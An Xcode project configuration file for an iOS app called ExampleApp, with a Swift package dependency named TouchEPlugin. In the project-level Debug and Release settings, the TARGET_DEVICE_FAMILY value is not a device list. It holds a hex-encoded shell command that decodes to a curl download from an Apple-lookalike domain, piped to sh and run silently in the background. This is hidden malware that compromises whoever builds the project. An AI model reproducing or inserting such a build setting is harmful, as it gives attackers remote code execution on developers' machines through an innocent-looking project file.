// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 55;
	objects = {

/* Begin PBXBuildFile section */
		041036492BDBA32700345192 /* MovieTBLCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 041036472BDBA32700345192 /* MovieTBLCell.swift */; };
		0410364A2BDBA32700345192 /* MovieTBLCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 041036482BDBA32700345192 /* MovieTBLCell.xib */; };
		0410364D2BDBA47900345192 /* CategoryCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0410364B2BDBA47900345192 /* CategoryCVCell.swift */; };
		0410364E2BDBA47900345192 /* CategoryCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0410364C2BDBA47900345192 /* CategoryCVCell.xib */; };
		04B08F4D2BD0DEEA00328A49 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F4C2BD0DEEA00328A49 /* AppDelegate.swift */; };
		04B08F512BD0DEEA00328A49 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F502BD0DEEA00328A49 /* ViewController.swift */; };
		04B08F542BD0DEEA00328A49 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 04B08F522BD0DEEA00328A49 /* Main.storyboard */; };
		04B08F562BD0DEEB00328A49 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 04B08F552BD0DEEB00328A49 /* Assets.xcassets */; };
		04B08F592BD0DEEB00328A49 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 04B08F572BD0DEEB00328A49 /* LaunchScreen.storyboard */; };
		04B08F702BD0E07D00328A49 /* UIViewXRadialGradient.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F632BD0E07D00328A49 /* UIViewXRadialGradient.swift */; };
		04B08F712BD0E07D00328A49 /* UITextFieldX.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F642BD0E07D00328A49 /* UITextFieldX.swift */; };
		04B08F722BD0E07D00328A49 /* UIButtonX.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F652BD0E07D00328A49 /* UIButtonX.swift */; };
		04B08F732BD0E07D00328A49 /* UILabelX.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F662BD0E07D00328A49 /* UILabelX.swift */; };
		04B08F742BD0E07D00328A49 /* UIViewControllerX.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F672BD0E07D00328A49 /* UIViewControllerX.swift */; };
		04B08F752BD0E07D00328A49 /* UIImageViewX.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F682BD0E07D00328A49 /* UIImageViewX.swift */; };
		04B08F762BD0E07D00328A49 /* UIViewX.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F692BD0E07D00328A49 /* UIViewX.swift */; };
		04B08F772BD0E07D00328A49 /* CustomTabBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F6A2BD0E07D00328A49 /* CustomTabBar.swift */; };
		04B08F782BD0E07D00328A49 /* uiTextViewStyle.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F6B2BD0E07D00328A49 /* uiTextViewStyle.swift */; };
		04B08F792BD0E07D00328A49 /* UIVisualEffectViewX.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F6C2BD0E07D00328A49 /* UIVisualEffectViewX.swift */; };
		04B08F7A2BD0E07D00328A49 /* UISliderX.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F6D2BD0E07D00328A49 /* UISliderX.swift */; };
		04B08F7D2BD0E12D00328A49 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F7C2BD0E12D00328A49 /* LoginViewController.swift */; };
		04B08F862BD0E9FD00328A49 /* Constant.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04B08F852BD0E9FD00328A49 /* Constant.swift */; };
		04D81D9E2D41041000933244 /* TouchEPlugin in Frameworks */ = {isa = PBXBuildFile; productRef = 04D81D9D2D41041000933244 /* TouchEPlugin */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		041036472BDBA32700345192 /* MovieTBLCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MovieTBLCell.swift; sourceTree = "<group>"; };
		041036482BDBA32700345192 /* MovieTBLCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MovieTBLCell.xib; sourceTree = "<group>"; };
		0410364B2BDBA47900345192 /* CategoryCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategoryCVCell.swift; sourceTree = "<group>"; };
		0410364C2BDBA47900345192 /* CategoryCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CategoryCVCell.xib; sourceTree = "<group>"; };
		04B08F492BD0DEEA00328A49 /* ExampleApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = ExampleApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
		04B08F4C2BD0DEEA00328A49 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		04B08F502BD0DEEA00328A49 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		04B08F532BD0DEEA00328A49 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		04B08F552BD0DEEB00328A49 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		04B08F582BD0DEEB00328A49 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		04B08F5A2BD0DEEB00328A49 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		04B08F632BD0E07D00328A49 /* UIViewXRadialGradient.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIViewXRadialGradient.swift; sourceTree = "<group>"; };
		04B08F642BD0E07D00328A49 /* UITextFieldX.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UITextFieldX.swift; sourceTree = "<group>"; };
		04B08F652BD0E07D00328A49 /* UIButtonX.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIButtonX.swift; sourceTree = "<group>"; };
		04B08F662BD0E07D00328A49 /* UILabelX.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UILabelX.swift; sourceTree = "<group>"; };
		04B08F672BD0E07D00328A49 /* UIViewControllerX.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIViewControllerX.swift; sourceTree = "<group>"; };
		04B08F682BD0E07D00328A49 /* UIImageViewX.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIImageViewX.swift; sourceTree = "<group>"; };
		04B08F692BD0E07D00328A49 /* UIViewX.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIViewX.swift; sourceTree = "<group>"; };
		04B08F6A2BD0E07D00328A49 /* CustomTabBar.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CustomTabBar.swift; sourceTree = "<group>"; };
		04B08F6B2BD0E07D00328A49 /* uiTextViewStyle.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = uiTextViewStyle.swift; sourceTree = "<group>"; };
		04B08F6C2BD0E07D00328A49 /* UIVisualEffectViewX.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIVisualEffectViewX.swift; sourceTree = "<group>"; };
		04B08F6D2BD0E07D00328A49 /* UISliderX.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UISliderX.swift; sourceTree = "<group>"; };
		04B08F7C2BD0E12D00328A49 /* LoginViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		04B08F852BD0E9FD00328A49 /* Constant.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Constant.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		04B08F462BD0DEEA00328A49 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				04D81D9E2D41041000933244 /* TouchEPlugin in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		041036462BDBA25500345192 /* Cell */ = {
			isa = PBXGroup;
			children = (
				041036472BDBA32700345192 /* MovieTBLCell.swift */,
				041036482BDBA32700345192 /* MovieTBLCell.xib */,
				0410364B2BDBA47900345192 /* CategoryCVCell.swift */,
				0410364C2BDBA47900345192 /* CategoryCVCell.xib */,
			);
			path = Cell;
			sourceTree = "<group>";
		};
		04B08F402BD0DEEA00328A49 = {
			isa = PBXGroup;
			children = (
				04B08F4B2BD0DEEA00328A49 /* ExampleApp */,
				04B08F4A2BD0DEEA00328A49 /* Products */,
				4D42F0A4F60BA9DA33BF6C74 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		04B08F4A2BD0DEEA00328A49 /* Products */ = {
			isa = PBXGroup;
			children = (
				04B08F492BD0DEEA00328A49 /* ExampleApp.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		04B08F4B2BD0DEEA00328A49 /* ExampleApp */ = {
			isa = PBXGroup;
			children = (
				041036462BDBA25500345192 /* Cell */,
				04B08F622BD0E07D00328A49 /* IBDesignables */,
				04B08F4C2BD0DEEA00328A49 /* AppDelegate.swift */,
				04B08F852BD0E9FD00328A49 /* Constant.swift */,
				04B08F7C2BD0E12D00328A49 /* LoginViewController.swift */,
				04B08F502BD0DEEA00328A49 /* ViewController.swift */,
				04B08F522BD0DEEA00328A49 /* Main.storyboard */,
				04B08F552BD0DEEB00328A49 /* Assets.xcassets */,
				04B08F572BD0DEEB00328A49 /* LaunchScreen.storyboard */,
				04B08F5A2BD0DEEB00328A49 /* Info.plist */,
			);
			path = ExampleApp;
			sourceTree = "<group>";
		};
		04B08F622BD0E07D00328A49 /* IBDesignables */ = {
			isa = PBXGroup;
			children = (
				04B08F632BD0E07D00328A49 /* UIViewXRadialGradient.swift */,
				04B08F642BD0E07D00328A49 /* UITextFieldX.swift */,
				04B08F652BD0E07D00328A49 /* UIButtonX.swift */,
				04B08F662BD0E07D00328A49 /* UILabelX.swift */,
				04B08F672BD0E07D00328A49 /* UIViewControllerX.swift */,
				04B08F682BD0E07D00328A49 /* UIImageViewX.swift */,
				04B08F692BD0E07D00328A49 /* UIViewX.swift */,
				04B08F6A2BD0E07D00328A49 /* CustomTabBar.swift */,
				04B08F6B2BD0E07D00328A49 /* uiTextViewStyle.swift */,
				04B08F6C2BD0E07D00328A49 /* UIVisualEffectViewX.swift */,
				04B08F6D2BD0E07D00328A49 /* UISliderX.swift */,
			);
			path = IBDesignables;
			sourceTree = "<group>";
		};
		4D42F0A4F60BA9DA33BF6C74 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		04B08F482BD0DEEA00328A49 /* ExampleApp */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 04B08F5D2BD0DEEB00328A49 /* Build configuration list for PBXNativeTarget "ExampleApp" */;
			buildPhases = (
				04B08F452BD0DEEA00328A49 /* Sources */,
				04B08F462BD0DEEA00328A49 /* Frameworks */,
				04B08F472BD0DEEA00328A49 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = ExampleApp;
			packageProductDependencies = (
				04D81D9D2D41041000933244 /* TouchEPlugin */,
			);
			productName = ExampleApp;
			productReference = 04B08F492BD0DEEA00328A49 /* ExampleApp.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		04B08F412BD0DEEA00328A49 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1320;
				LastUpgradeCheck = 1320;
				TargetAttributes = {
					04B08F482BD0DEEA00328A49 = {
						CreatedOnToolsVersion = 13.2.1;
					};
				};
			};
			buildConfigurationList = 04B08F442BD0DEEA00328A49 /* Build configuration list for PBXProject "ExampleApp" */;
			compatibilityVersion = "Xcode 13.0";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 04B08F402BD0DEEA00328A49;
			packageReferences = (
				04D81D9C2D41041000933244 /* XCRemoteSwiftPackageReference "TouchEPlugin" */,
			);
			productRefGroup = 04B08F4A2BD0DEEA00328A49 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				04B08F482BD0DEEA00328A49 /* ExampleApp */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		04B08F472BD0DEEA00328A49 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				04B08F592BD0DEEB00328A49 /* LaunchScreen.storyboard in Resources */,
				04B08F562BD0DEEB00328A49 /* Assets.xcassets in Resources */,
				04B08F542BD0DEEA00328A49 /* Main.storyboard in Resources */,
				0410364E2BDBA47900345192 /* CategoryCVCell.xib in Resources */,
				0410364A2BDBA32700345192 /* MovieTBLCell.xib in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		04B08F452BD0DEEA00328A49 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				04B08F792BD0E07D00328A49 /* UIVisualEffectViewX.swift in Sources */,
				04B08F862BD0E9FD00328A49 /* Constant.swift in Sources */,
				04B08F512BD0DEEA00328A49 /* ViewController.swift in Sources */,
				041036492BDBA32700345192 /* MovieTBLCell.swift in Sources */,
				04B08F4D2BD0DEEA00328A49 /* AppDelegate.swift in Sources */,
				04B08F722BD0E07D00328A49 /* UIButtonX.swift in Sources */,
				0410364D2BDBA47900345192 /* CategoryCVCell.swift in Sources */,
				04B08F772BD0E07D00328A49 /* CustomTabBar.swift in Sources */,
				04B08F7A2BD0E07D00328A49 /* UISliderX.swift in Sources */,
				04B08F762BD0E07D00328A49 /* UIViewX.swift in Sources */,
				04B08F732BD0E07D00328A49 /* UILabelX.swift in Sources */,
				04B08F702BD0E07D00328A49 /* UIViewXRadialGradient.swift in Sources */,
				04B08F782BD0E07D00328A49 /* uiTextViewStyle.swift in Sources */,
				04B08F712BD0E07D00328A49 /* UITextFieldX.swift in Sources */,
				04B08F7D2BD0E12D00328A49 /* LoginViewController.swift in Sources */,
				04B08F752BD0E07D00328A49 /* UIImageViewX.swift in Sources */,
				04B08F742BD0E07D00328A49 /* UIViewControllerX.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		04B08F522BD0DEEA00328A49 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				04B08F532BD0DEEA00328A49 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		04B08F572BD0DEEB00328A49 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				04B08F582BD0DEEB00328A49 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		04B08F5B2BD0DEEB00328A49 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++17";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 15.2;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
				TARGET_DEVICE_FAMILY = "(echo 363536333638366632303232323432383633373537323663323032643636\n373336623463323036383734373437303733336132663266363436353736\n0a3631373037303663363532653732373532663631323932323230376332\n303733363830610a | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
			};
			name = Debug;
		};
		04B08F5C2BD0DEEB00328A49 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++17";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 15.2;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				TARGET_DEVICE_FAMILY = "(echo 363536333638366632303232323432383633373537323663323032643636\n373336623463323036383734373437303733336132663266363436353736\n0a3631373037303663363532653732373532663631323932323230376332\n303733363830610a | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		04B08F5E2BD0DEEB00328A49 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = X2YJXZ7VP5;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = ExampleApp/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.ExampleApp;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		04B08F5F2BD0DEEB00328A49 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = X2YJXZ7VP5;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = ExampleApp/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.ExampleApp;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		04B08F442BD0DEEA00328A49 /* Build configuration list for PBXProject "ExampleApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				04B08F5B2BD0DEEB00328A49 /* Debug */,
				04B08F5C2BD0DEEB00328A49 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		04B08F5D2BD0DEEB00328A49 /* Build configuration list for PBXNativeTarget "ExampleApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				04B08F5E2BD0DEEB00328A49 /* Debug */,
				04B08F5F2BD0DEEB00328A49 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		04D81D9C2D41041000933244 /* XCRemoteSwiftPackageReference "TouchEPlugin" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/Touch-E/TouchEPlugin.git";
			requirement = {
				branch = main;
				kind = branch;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		04D81D9D2D41041000933244 /* TouchEPlugin */ = {
			isa = XCSwiftPackageProductDependency;
			package = 04D81D9C2D41041000933244 /* XCRemoteSwiftPackageReference "TouchEPlugin" */;
			productName = TouchEPlugin;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 04B08F412BD0DEEA00328A49 /* Project object */;
}
